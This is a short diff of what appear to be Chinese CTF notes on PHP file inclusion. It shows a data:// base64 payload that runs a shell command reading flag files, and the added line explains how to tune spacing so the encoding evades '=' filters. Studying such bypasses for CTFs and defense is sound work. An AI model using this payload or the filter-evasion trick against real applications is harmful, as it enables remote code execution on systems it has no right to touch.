@@ -53,6 +53,7 @@ payload：
 
 防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
 但是结尾有.php的情况：include($c.".php"); 编码后会失效。
+如果=也过滤，调整空格数量，直至base64后没有==
 ```
 
 ^
